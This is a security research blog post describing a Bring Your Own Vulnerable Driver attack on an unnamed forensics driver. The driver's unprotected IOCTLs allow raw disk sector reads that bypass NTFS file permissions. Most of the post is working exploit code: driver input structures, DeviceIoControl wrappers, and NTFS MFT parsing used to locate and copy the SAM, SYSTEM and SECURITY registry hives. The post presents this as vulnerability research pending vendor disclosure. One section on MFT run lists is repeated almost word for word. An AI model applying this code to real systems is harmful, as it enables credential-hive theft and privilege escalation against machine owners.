---
title: "Bypassing NTFS ACLs and File Locks via Direct Device Object I/Os From Kernel Mode"
date: 2026-03-05  00:00:00 -0500
categories: [research]
tags: [BYOVD]
image:
  path: /assets/img/posts/Bypassing-NTFS-ACLs/Header.png
  alt: Bypassing NTFS ACLs and File Locks via Direct Device Object I/Os From Kernel Mode
---

## Introduction
I recently began exploring kernel-mode drivers for Bring Your Own Vulnerable Driver (BYOVD) attacks during network testing. I found that many data forensics tools often export functions that can be leveraged for exploitation, like `ZwOpenSection`, `MmMapIoSpace`, & `ZwTerminateProcess`. A particular driver I identified used `IoBuildSynchronousFsdRequest` and `IofCallDriver` to read files from disk.sys bypassing NTFS protections. Unfortunately, the driver is not cross-signed by Microsoft, mitigating a lot of the impact. *I will update this post with the name of the driver once it is properly disclosed to the vendor*

## Initial Analysis
To start analysing the program, I used the [Driver Buddy Revolutions Plugin](https://plugins.hex-rays.com/jsacco/driverbuddyrevolutionsida) for IDA and found that various IOCTL's are missing privilege gates. This would allow low-privilege users use the IOCTLs if the driver was already installed. Next, I used my [IDA MCP](https://github.com/mrexodia/ida-pro-mcp) setup with Claude and have the agent decompile, rename functions, and add comments where necessary to speed up the process.

After all of this was done, I was able to quickly pull out the device name (`\Device\addriver`) and see what IOCTLs call certain functions. Various vulnerable functions can be called from IOCTLs, but for this post, we will focus on those that will help with reading files, bypassing NTFS restrictions (e.g., `0x8000E004`, `0x8000E000`).

## Finding The Vulnerability
The IOCTL handler `0x8000E000` executes a function (renamed by Claude to IoctlReadDiskSectors)  that processes a 112‑byte input buffer supplied by the caller.

```c
case 0x8000E000:
      ProcessNotifyRoutine = IoctlReadDiskSectors(a2, p_MajorFunction, &v19);
```

Early in the function, the driver verifies the input size:

```c
if (v6 && *(_DWORD *)(a2 + 16) == 112)
```

`(a2 + 16)` corresponds to InputBufferLength, confirming that the driver expects a fixed‑size 112‑byte structure.

The first 100 (`0x64`) bytes of the buffer are validated as a NULL‑terminated string:

```c
do {
    if (*v9 == 0)
        break;
} while (v8 < 0x64);
```

This indicates that the beginning of the buffer contains a device name.

Further down, two additional fields are read directly from the buffer:

```c
v10 = *(_DWORD *)(v6 + 100);
v19 = *(_QWORD *)(v6 + 104);
```
These offsets reveal the remaining structure fields:

`+0x64` (100) → sector count

`+0x68` (104) → starting LBA

This is later passed to the function `IoBuildSynchronousFsdRequest` using `IRP_MJ_READ`, allowing for arbitrary read of disk sectors from user mode, effectively bypassing NTFS read restrictions entirely.

```c
v16 = IoBuildSynchronousFsdRequest(
    3u,                                          // IRP_MJ_READ (major function code = read)
    *(PDEVICE_OBJECT *)((char *)v11 + 241),     // Target device object (selected disk) 
    (PVOID)(v6 + i * *(_DWORD *)((char *)v11 + 117)), // Output buffer for this sector read
    *(_DWORD *)((char *)v11 + 117),             // Length of the read = sector size
    &Timeout,                                   // Byte offset on disk for this read
                                                //   -> Timeout.QuadPart = sector_size * (StartLba + i)
                                                //   -> StartLba = user input from v6 + 104
    &Event,                                     // Event used to wait for completion
    &IoStatusBlock                              // IO_STATUS_BLOCK that will receive status info
);
```

Based on this, the IOCTL input buffer for our POC can be crafted like:

```c
struct ReadSectorsInput
{
    char     DiskName[100];
    uint32_t SectorCount;
    uint64_t StartLba;
};
```

## Getting the Disk Name
Knowing that the disk name would need to be passed into the vulnerable function, I looked to enumerate the disk name at runtime. Thankfully, the driver already does this for us at IOCTL `0x8000E004`.

Looking at the implementation reveals that the driver maintains an internal linked list of disk records, which are populated by a helper function. The enumeration routine walks the Windows disk driver (`\Driver\Disk`) device chain and gathers metadata for each disk device object. Once enumeration has completed, IoctlEnumDiskDevices simply iterates over the linked list and copies each entry to the caller's output buffer.

The following code shows 0xE1 bytes (225 bytes) from the internal disk record  into the user-provided buffer. Because this copy occurs for each disk entry, we can infer that each disk record stored internally by the driver has a size of 225 bytes.

```c
memmove((void *)(v9 + v3), v8 + 2, 0xE1u);
```

Enumerating the function reveals where different pieces of information are written inside this structure. By tracking writes into the allocated record buffer, the layout of the structure can be reconstructed:

```c
struct DiskRecord
{
    char     DeviceName[100]; 
    uint8_t  IsDrDevice;
    uint32_t SectorSize;
    uint64_t TotalSectors;
    uint32_t AtaType;
    uint32_t PartitionType;
    uint32_t BusType;
    char     Model[41];
    uint8_t  _pad1[9];        // to reach offset 175
    char     Serial[36];
    uint8_t  _pad2[14];       // pad to 225 total
};
static_assert(sizeof(DiskRecord) == 225, "DiskRecord must be 225 bytes");
```

## Writing the Exploit
With all of the information on how to interact with the driver, it was time to write the code.

The chain of attack would be to:

1. **Enumerate disks** — `IOCTL 0x8000E004` populates the driver's internal list and returns 225-byte records. Extract the device name and sector size from the first raw disk record (`IsDrDevice == 1`).
2. **Find the Windows partition** — read LBA 0 to get the MBR/GPT, locate the Microsoft Basic Data partition start LBA.
3. **Parse the NTFS VBR** — read the partition start sector, extract `BytesPerSector`, `SectorsPerCluster`, `MftLcn`, and `ClustersPerMftRecord` from the BPB.
4. **Build the MFT run list** — read MFT record 0 (`$MFT`), decode its `$DATA` non-resident run list to handle fragmented volumes correctly.
5. **Scan the MFT** — walk every record, apply the update sequence fixup, parse `$FILE_NAME` attributes to locate SAM and SYSTEM by name.
6. **Extract the file** — parse the `$DATA` run list of the target record and read each run sector-by-sector via `IOCTL 0x8000E000`.

### Disk enumeration

The first IOCTL call sends a dummy DWORD input and receives back an array of 225-byte records, one per enumerated disk. The `returned / 225` division gives the count:

```c
static bool EnumerateDisks()
{
    const DWORD bufSize = 16 * 225;
    std::vector buf(bufSize, 0);
    DWORD dummy = 0, returned = 0;

    DeviceIoControl(g_hDriver, 0x8000E004,
                    &dummy, sizeof(dummy),
                    buf.data(), bufSize,
                    &returned, nullptr);

    uint32_t count = returned / 225;
    for (uint32_t i = 0; i < count; ++i)
    {
        auto* rec = reinterpret_cast(buf.data() + i * 225);
        // IsDrDevice == 1: raw disk (\DR) — this is what we want
        // IsDrDevice == 0: partition device (\DP() — skip
        if (rec->IsDrDevice && g_DiskName[0] == '\0')
        {
            strncpy_s(g_DiskName, sizeof(g_DiskName), rec->DeviceName, _TRUNCATE);
            g_SectorSize = rec->SectorSize ? rec->SectorSize : 512;
        }
    }
    return g_DiskName[0] != '\0';
}
```

### Sector reads

Every subsequent read uses the same `ReadSectors` helper, which fills out the 112-byte `ReadSectorsInput` and calls `IOCTL 0x8000E000`:

```cpp
static bool ReadSectors(uint64_t lba, uint32_t count, void* buf)
{
    ReadSectorsInput in = {};
    strncpy_s(in.DiskName, sizeof(in.DiskName), g_DiskName, _TRUNCATE);
    in.SectorCount = count;
    in.StartLba    = lba;

    DWORD returned = 0;
    return DeviceIoControl(g_hDriver, 0x8000E000,
                           &in,  sizeof(in),
                           buf,  count * g_SectorSize,
                           &returned, nullptr)
           && returned == count * g_SectorSize;
}
```

### Parsing the NTFS VBR

The BIOS parameter block at the partition start sector gives cluster and MFT (Master File Table) geometry:

```cpp
uint16_t bytesPerSector    = *reinterpret_cast(vbr.data() + 11);
uint8_t  sectorsPerCluster =  vbr[13];
uint64_t mftLcn            = *reinterpret_cast(vbr.data() + 48);

// ClustersPerMftRecord at offset 64: if negative, bytes = 2^(-n)
int8_t  cpm = static_cast(vbr[64]);
uint32_t bytesPerRecord = (cpm < 0)
    ? (1u << static_cast(-cpm))
    : static_cast(cpm) * bytesPerSector * sectorsPerCluster;

info.MftStartLba = partStartLba + mftLcn * sectorsPerCluster;
```

### MFT run-list for fragmented volumes

The assumption that the MFT is a single contiguous run fails on any real Windows install. MFT record 0 (`$MFT`) describes the MFT file itself — its non-resident `$DATA` attribute (type `0x80`, `FormCode == 1`, `NameLength == 0`) holds the run list for the entire MFT.

NTFS run list encoding: each entry starts with a header byte where the low nibble is the byte-width of the length field, and the high nibble is the byte-width of the LCN delta. The LCN delta is signed and must be sign-extended. A `0x00` header byte terminates the list:

```cpp
uint64_t currentLcn = 0;
while (i < maxLen)
{
    uint8_t hdr     = runs[i++];
    if (hdr == 0) break;
    uint8_t lenBytes = hdr & 0x0F;
    uint8_t lcnBytes = (hdr >> 4) & 0x0F;

    uint64_t runLen = 0;
    for (uint8_t b = 0; b < lenBytes; ++b)
        runLen |= static_cast(runs[i++]) << (8 * b);

    int64_t lcnDelta = 0;
    for (uint8_t b = 0; b < lcnBytes; ++b)
        lcnDelta |= static_cast(runs[i++]) << (8 * b);
    // sign-extend
    if (lcnBytes < 8 && (lcnDelta >> (8 * lcnBytes - 1)) & 1)
        lcnDelta |= ~((int64_t(1) << (8 * lcnBytes)) - 1);

    currentLcn += lcnDelta;
    out.push_back({ static_cast(currentLcn), runLen });
}
```

Each record number is then mapped to its real LBA by walking the run list:

```cpp
uint64_t offset = 0;
for (const auto& run : mftRuns)
{
    if (recNum < offset + run.RecordCount)
    {
        outLba = run.StartLba + (recNum - offset) * sectorsPerRecord;
        return true;
    }
    offset += run.RecordCount;
}
```
### MFT run list

MFT record 0 (`$MFT`) holds the run list for the entire MFT in its non-resident `$DATA` attribute. Each run entry is encoded with a header byte where the low nibble is the byte-width of the length field and the high nibble is the byte-width of the signed LCN delta:

```cpp
uint64_t currentLcn = 0;
while (i < maxLen)
{
    uint8_t hdr      = runs[i++];
    if (hdr == 0) break;
    uint8_t lenBytes = hdr & 0x0F;
    uint8_t lcnBytes = (hdr >> 4) & 0x0F;

    uint64_t runLen = 0;
    for (uint8_t b = 0; b < lenBytes; ++b)
        runLen |= (uint64_t)runs[i++] << (8 * b);

    int64_t lcnDelta = 0;
    for (uint8_t b = 0; b < lcnBytes; ++b)
        lcnDelta |= (int64_t)runs[i++] << (8 * b);
    if (lcnBytes < 8 && (lcnDelta >> (8 * lcnBytes - 1)) & 1)
        lcnDelta |= ~((int64_t(1) << (8 * lcnBytes)) - 1);

    currentLcn += lcnDelta;
    out.push_back({ (uint64_t)currentLcn, runLen });
}
```

Record numbers map to LBAs by walking the run list:

```cpp
uint64_t offset = 0;
for (const auto& run : mftRuns)
{
    if (recNum < offset + run.RecordCount)
    {
        outLba = run.StartLba + (recNum - offset) * sectorsPerRecord;
        return true;
    }
    offset += run.RecordCount;
}
```

### Update sequence fixup

Before parsing attributes in any MFT record, the NTFS update sequence must be applied. NTFS replaces the last 2 bytes of each 512-byte sector within the record with a sequence number; they are restored from the update sequence array at `hdr->UpdateSeqOffset`:

```cpp
uint16_t* usa = (uint16_t *)(rec + hdr->UpdateSeqOffset);
uint16_t  seq = usa[0];
for (uint16_t i = 1; i < hdr->UpdateSeqCount; ++i)
{
    uint16_t* slot = (uint16_t *)(rec + i * 512 - 2);
    if (*slot == seq) *slot = usa[i];
}
```

### Finding SAM, SYSTEM, and SECURITY in the MFT

For each in-use MFT record, `$FILE_NAME` attributes (type `0x30`, `FormCode == 0`) are compared against the target name. The `$FILE_NAME` value layout:

```
+0x00  ParentDirectory  8 bytes
+0x08  CreationTime     8 bytes
+0x10  ModificationTime 8 bytes
+0x18  MftChangeTime    8 bytes
+0x20  AccessTime       8 bytes
+0x28  AllocatedSize    8 bytes
+0x30  RealSize         8 bytes
+0x38  Flags            4 bytes
+0x3C  ReparseTag       4 bytes
+0x40  FileNameLength   1 byte   (characters, not bytes)
+0x41  Namespace        1 byte
+0x42  FileName[]       UTF-16LE
```

```cpp
uint8_t fnLen = val[0x40];
const uint8_t* fn = val + 0x42;

if (fnLen == strlen(targetName))
{
    bool match = true;
    for (size_t c = 0; c < fnLen; ++c)
    {
        uint16_t wc = *(uint16_t *)(fn + c * 2);
        if (tolower(wc & 0xFF) != tolower((unsigned char)targetName[c]))
            { match = false; break; }
    }
    if (match) nameMatch = true;
}
```

### Extracting the file

Once the record is found, the non-resident `$DATA` run list is decoded, and each cluster run is read in 1 MB chunks:

```cpp
for (const auto& run : dataRuns)
{
    uint64_t runLba   = partStartLba + run.Lcn * sectorsPerCluster;
    uint64_t runBytes = run.LengthClusters * bytesPerCluster;
    if (runBytes > bytesLeft) runBytes = bytesLeft;

    uint32_t sectorsTotal = (runBytes + g_SectorSize - 1) / g_SectorSize;
    const uint32_t CHUNK  = 2048;

    for (uint32_t off = 0; off < sectorsTotal; off += CHUNK)
    {
        uint32_t toRead  = min(CHUNK, sectorsTotal - off);
        ReadSectors(runLba + off, toRead, chunk.data());
        DWORD writeBytes = min((uint64_t)(toRead * g_SectorSize), bytesLeft);
        DWORD written    = 0;
        WriteFile(hOut, chunk.data(), writeBytes, &written, nullptr);
        bytesLeft -= written;
    }
}
```

### Results
![POC](/assets/img/posts/Bypassing-NTFS-ACLs/POC.gif)

![Parsed](/assets/img/posts/Bypassing-NTFS-ACLs/ParsedHives.png)

*I will post the entire POC to my GitHub once the vulnerability has been disclosed.
